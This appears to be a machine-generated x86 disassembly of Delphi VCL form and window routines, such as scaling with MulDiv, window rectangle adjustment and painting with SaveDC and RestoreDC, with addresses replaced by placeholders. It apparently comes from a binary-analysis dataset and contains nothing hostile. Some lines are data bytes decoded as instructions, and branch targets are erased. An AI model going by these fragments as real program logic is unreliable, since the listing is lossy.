mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
sub_460e58
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40348c
and [ ebx + 0x2f4 ] 0xdf
sub_460e90
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46049c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_448264
xor edx edx
mov eax ebx
call sub_448288
mov edx 0x140
mov eax ebx
call sub_4482b0
mov edx 0xf0
mov eax ebx
call sub_4482d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_42883c
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4617ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_4476d0
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031d8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_461b10
xor edx edx
mov eax ebx
call sub_448cb8
xor edx edx
mov eax ebx
call sub_448c20
mov dl 0x1
mov eax ebx
call sub_44f41c
mov edx ebx
mov eax [ rw-data ]
call sub_466174
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_461009
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_4209b4
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4184ac
xor edx edx
mov eax ebx
call sub_41b7e4
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_46501c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_461074
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403644
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_46113e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463998
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4661ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403290
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403290
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_460514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461145
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_461158
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_403758#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461b10
sub_46119e
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40348c
test al al
jne r-xdata
call sub_403ac0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a6c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461b10
sub_4611d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_403758#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_461234
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44abb0
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4634dc
sub_461270
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_447fc4
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_4181b4
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4628d4
mov edx esi
mov eax ebp
call sub_4184ac
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4628ac
mov edx esi
mov eax edi
call sub_4628d4
jmp r-xdata
xor edx edx
mov eax edi
call sub_462888
sub_46137c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor edx edx
push ebp
push sub_4615d2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b2d0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448510
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448554
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_461704
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_449ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4615d9
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4609dc
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44eda0
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4609dc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44eda0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_4239c8
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4239d0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4615e1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c61c
push 0x0
push 0x0
push ebx
push sub_4616e8
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4616b4
push ebx
push sub_4616cc
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_461693
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41bedc
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_448c20
sub_46171f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4609dc
mov ecx edi
mov edx esi
mov eax ebx
call sub_44eda0
mov eax ebx
call sub_461808
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_423a6c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_423a88
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44853c
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4484f8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_461ab0
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_461ae0
sub_4617ac
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_463b0c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_461840
push ebx
mov ebx eax
mov eax ebx
call sub_46275c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_4618d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2dc
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44f3a4
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_44f2dc
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_44f2dc
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_46195c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_44f880
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420d38
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420d0c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40348c
test al al
jne r-xdata
sub_4619c8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031d8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4619f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebp
call sub_44c00c
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420d38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44f8c8
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_420d0c
mov si 0xfff1
call sub_40348c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420d48
jmp r-xdata
sub_461a88
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_448cdc
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_449ca8
sub_461ab0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_448510
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_461ae0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_448554
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_461b10
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_448a14
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_462c48
pop esi
pop ebx
retn
sub_461b54
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_461bad
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461bb4
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
sub_461bbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_4489c8
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44c834
mov eax ebx
call sub_44c9d0
sub_461bf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420b84
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_461c34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ccf0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_40348c
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_449ca8
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45bd50
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_462560
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461ead
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_461e90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_424934
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4247d4
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45d238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461e97
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424934
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45bd50
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_462560
call sub_44f2dc
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_461fdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461fb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_461f97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_424934
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4247d4
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f9e
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424934
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_44f2dc
mov esi eax
sub_461fbb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ReleaseDC
retn
sub_46206c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4620b8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_462594
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4625e0
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4620f8
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_4622c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
